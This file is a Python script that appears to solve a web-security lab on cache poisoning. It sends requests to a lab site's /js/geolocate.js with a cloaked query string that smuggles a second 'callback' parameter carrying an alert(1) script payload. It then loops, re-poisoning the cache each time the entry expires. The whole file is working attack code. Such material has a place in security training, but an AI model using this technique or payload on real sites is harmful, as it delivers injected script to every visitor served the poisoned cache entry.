import http.client
import random
import ssl
import string
import time
import urllib.parse

LAB_ID = "???"


def GET_(
        query: str | None = None,
        cache_buster: str | None = None,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/js/geolocate.js'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    if query:
        path = f"{path}?{query}"
    if cache_buster:
        headers['origin'] = f'https://{cache_buster}.com'
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, path, '', headers)
    return connection.getresponse()


def random_str() -> str:
    return ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(6))


print("poisoning cache")
for i in range(5):
    response = GET_(
        # cache_buster=random_str(),
        query="callback=setCountryCookie&utm_content=y;callback=alert(1)+%2B+console.log",
    )
    print(f"response: {response.status}")
    for header, value in response.headers.items():
        print(f"{header}: {value}")
    print(response.read().decode())
    max_age = int(urllib.parse.parse_qs(response.headers['cache-control'])['max-age'][0])
    age = int(response.headers['age'])
    time_asleep = max_age - age + 1
    print(f"max age: {max_age}, age: {age}, re-poisoning in {time_asleep}")
    time.sleep(time_asleep)
